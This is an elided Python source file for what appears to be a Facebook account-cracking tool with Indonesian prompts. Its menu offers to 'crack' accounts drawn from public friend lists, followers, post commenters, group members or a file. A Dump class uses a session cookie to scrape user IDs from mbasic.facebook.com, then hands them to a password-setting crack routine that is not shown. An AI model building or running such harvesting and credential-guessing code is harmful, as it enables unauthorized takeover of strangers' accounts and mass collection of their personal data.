...
class Logo:
	...
	def logonya(self):
		...
		prints(Panel(Panel(f"""[{color_panel}]
...
""",width=100,padding=(0,10),style=f"bold white", title=f"[bold green]><WELCOME><"),style=f"{color_panel}"))
...
class Menu:
	...
	def menu(self):
		...
		prints(Panel(f"""{P2}
[{color_text}01{P2}]. CRACK FROM PUBLIC     [{color_text}04{P2}]. CRACK FROM PERSONS NAME
[{color_text}02{P2}]. CRACK FROM FOLLOWERS  [{color_text}05{P2}]. CRACK GROUP MEMBERS
[{color_text}03{P2}]. CRACK FROM COMMENTS   [{color_text}06{P2}]. CRACK FROM FILE
...
class Dump:
	...
	###----------[ ID PUBLIK ]---------- ###
		if menu in["1","01"]:
			prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}â€¢ {P2}ENTER ID OR USERNAME : ")
			if user in["Me","me"]:
				user = Dump(cookie).GetUser()
			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
			Crack().atursandi()
		...
		###----------[ KOMENTAR ]---------- ###
			...
			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}â€¢ {P2}masukan id postingan : ")
			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
			Crack().atursandi()
		...
		###----------[ MEMBER GRUP ]---------- ###
			...
			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}â€¢ {P2}masukan id grup : ")
			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
			Crack().atursandi()
		...
		###----------[ FILE MASSAL ]---------- ###
			...
			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}â€¢ {P2}masukan tempat file : ")
			Dump(cookie).Dump_File(user)
			Crack().atursandi()
		...
		try:
			...
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					...
					console.print(f" {H2}â€¢ {P2}PROCESS DUMPING IDS {len(tampung)} id....", end="\r")
